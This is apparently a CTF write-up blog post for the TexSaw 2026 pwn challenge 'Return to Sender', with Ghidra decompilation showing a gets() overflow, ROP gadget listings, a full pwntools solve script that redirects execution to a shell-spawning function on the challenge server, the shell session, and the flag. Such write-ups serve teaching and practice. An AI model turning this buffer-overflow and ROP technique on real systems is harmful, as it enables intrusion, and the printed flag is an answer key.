---
layout: post
title:  "Pwn Challenges"
date:   2026-03-30 20:37:00 -0400
author: robo.uzi
tags: [CTF]
permalink: /TexSawCTF-2026-pwn/
---

## Return to Sender

**Author**: Written by Wulfyrn

**Category**: pwn

**Description**: Do you ever wonder what happens to your packages? So does your mail carrier.        `nc 143.198.163.4 15858`. Flag format: `texsaw{example_flag}`

I get the challenge file:
```shell
file chall  
chall: ELF 64-bit LSB executable, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, BuildID[sha1]=74a5c012b47fb07debb2821d2849f371032f6a15, for GNU/Linux 3.2.0, not stripped

./chall  
Our modern and highly secure postal service never fails to deliver your package.  
  
Where would you like to send your package?  
  
Some Options:  
0 Address Avenue  
1 Buffer Boulevard  
2 Canary Court  
  
2  
Sorry, we couldn't deliver your package. Returning to sender...
```

I get this from the server:
```shell
nc 143.198.163.4 15858  
Our modern and highly secure postal service never fails to deliver your package.  
  
Where would you like to send your package?  
  
Some Options:  
0 Address Avenue  
1 Buffer Boulevard  
2 Canary Court  
  
0  
Sorry, we couldn't deliver your package. Returning to sender...
```

I find these functions in Ghidra:

`deliver()`:
```shell
void deliver(void)

{
  int iVar1;
  char local_28 [32];
  
  puts("Where would you like to send your package?\n");
  puts("Some Options:\n0 Address Avenue\n1 Buffer Boulevard\n2 Canary Court\n");
  gets(local_28);
  iVar1 = strcmp(local_28,"0 Address Avenue");
  if (iVar1 == 0) {
    puts("Delivering to 0 Address Avenue...\n");
    avenue();
  }
  else {
    iVar1 = strcmp(local_28,"1 Buffer Boulevard");
    if (iVar1 == 0) {
      puts("Delivering to 1 Buffer Boulevard...\n");
      boulevard();
    }
    else {
      iVar1 = strcmp(local_28,"2 Canary Court");
      if (iVar1 == 0) {
        puts("Delivering to 2 Canary Court...\n");
        court();
      }
      else {
        puts("Sorry, we couldn\'t deliver your package. Returning to sender...\n");
      }
    }
  }
  return;
}
```

`drive()`:
```shell
void drive(long param_1)

{
  puts("Attempting secret delivery to 3 Dangerous Drive...\n");
  if (param_1 == 0x48435344) {
    puts("Success! Secret package delivered.\n");
    system("/bin/sh");
  }
  else {
    puts("Need the secret key to deliver this package.\n");
  }
  return;
}
```

`main()`:
```shell
undefined8 main(void)

{
  setbuf(stdout,(char *)0x0);
  setbuf(stdin,(char *)0x0);
  setbuf(stderr,(char *)0x0);
  puts("Our modern and highly secure postal service never fails to deliver your package.\n");
  deliver();
  return 0;
}
```

Get addresses for the required function and ROP gadgets:
```shell
nm chall | grep drive  
0000000000401211 T drive

ROPgadget --binary chall | grep "pop rdi"  
0x00000000004011b9 : cli ; push rbp ; mov rbp, rsp ; pop rdi ; ret  
0x00000000004011b6 : endbr64 ; push rbp ; mov rbp, rsp ; pop rdi ; ret  
0x00000000004011bc : mov ebp, esp ; pop rdi ; ret  
0x00000000004011bb : mov rbp, rsp ; pop rdi ; ret  
0x00000000004011be : pop rdi ; ret  
0x00000000004011ba : push rbp ; mov rbp, rsp ; pop rdi ; ret
```

Solve script:
```shell
from pwn import *

context.binary = './chall'
elf = ELF('./chall')

p = remote('143.198.163.4', 15858)

# Wait for the menu prompt
p.recvuntil(b"2 Canary Court\n")

# Offsets and addresses
offset = 40
pop_rdi = 0x4011be      # pop rdi; ret
secret = 0x48435344     # "HCSD"
drive = elf.symbols['drive']  # 0x401211
ret = 0x4011bf          # a simple ret for alignment

# Build the ROP chain
payload = b'A' * offset
payload += p64(pop_rdi)
payload += p64(secret)
payload += p64(ret)
payload += p64(drive)

p.sendline(payload)
p.interactive()
```

Output:
```shell
python3 solve4.py  
[*] '/home/user/Desktop/ctf/texsaw2026/chall'  
	Arch:       amd64-64-little  
	RELRO:      Partial RELRO  
	Stack:      No canary found  
	NX:         NX unknown - GNU_STACK missing  
	PIE:        No PIE (0x400000)  
	Stack:      Executable  
	RWX:        Has RWX segments  
	SHSTK:      Enabled  
	IBT:        Enabled  
	Stripped:   No  
[+] Opening connection to 143.198.163.4 on port 15858: Done  
[*] Switching to interactive mode  
  
Sorry, we couldn't deliver your package. Returning to sender...  
  
Attempting secret delivery to 3 Dangerous Drive...  
  
Success! Secret package delivered.  
  
$ id  
uid=1000(ubuntu) gid=1000(ubuntu) groups=1000(ubuntu)  
$ ls  
flag.txt  
run  
$ cat flag.txt  
texsaw{sm@sh_st4ck_2_r3turn_to_4nywh3re_y0u_w4nt}  
$ exit  
[*] Got EOF while reading in interactive  
$  
[*] Interrupted  
[*] Closed connection to 143.198.163.4 port 15858
```

`texsaw{sm@sh_st4ck_2_r3turn_to_4nywh3re_y0u_w4nt}`
